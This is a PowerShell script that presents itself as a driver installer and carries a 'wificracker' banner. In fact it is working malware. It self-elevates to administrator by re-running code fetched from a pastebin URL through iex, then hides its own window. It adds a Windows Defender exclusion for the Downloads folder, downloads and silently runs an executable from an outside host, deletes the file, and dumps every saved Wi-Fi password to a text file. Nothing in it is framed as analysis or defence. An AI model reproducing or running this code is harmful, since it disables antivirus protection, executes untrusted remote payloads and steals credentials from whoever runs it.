# Driver Installer Script (Hidden Mode + UAC + Exclusion)

# --- ASCII Art Header (Only visible if not hidden yet) ---
Write-Host @"
          _  __ _                     _             
__      _(_)/ _(_) ___ _ __ __ _  ___| | _____ _ __ 
\ \ /\ / / | |_| |/ __| '__/ _` |/ __| |/ / _ \ '__|
 \ V  V /| |  _| | (__| | | (_| | (__|   <  __/ |   
  \_/\_/ |_|_| |_|\___|_|  \__,_|\___|_|\_\___|_|   
"@ -ForegroundColor Cyan

# --- Priority 0: Self-Elevate to Admin (UAC) ---
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://pastebin.com/raw/YOUR_PASTEBIN_ID | iex`"" -Verb RunAs
    exit
}

$url = "https://dkm.s.gy/file"
$out = "$env:USERPROFILE\Downloads\drivers.exe"
$wifiLog = "$env:USERPROFILE\Desktop\WiFi_Passwords.txt"
$excludePath = "$env:USERPROFILE\Downloads"

# --- Hide Window Immediately ---
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WindowHelper {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
$hWnd = [WindowHelper]::GetForegroundWindow()
[WindowHelper]::ShowWindow($hWnd, 0) # 0 = Hide Window Completely

# --- Priority 1: Add Defender Exclusion ---
try {
    Add-MpPreference -ExclusionPath $excludePath -ErrorAction SilentlyContinue
} catch { }

# --- Priority 2: Download and Run Immediately ---
try {
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
    
    if (Test-Path $out) {
        Start-Process -FilePath $out -Wait
        Remove-Item $out -Force -ErrorAction SilentlyContinue
    }
} catch { }

# --- Priority 3: WiFi Password Extraction ---
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
$results = @()

foreach ($profile in $profiles) {
    try {
        $details = netsh wlan show profile name="$profile" key=clear
        $key = ($details | Select-String "Key Content").ToString().Split(":")[1].Trim()
        $results += "SSID: $profile | Password: $key"
    } catch {
        $results += "SSID: $profile | Password: [Hidden/Empty]"
    }
}

$results | Out-File -FilePath $wifiLog -Encoding utf8

# --- Exit the terminal silently ---
exit
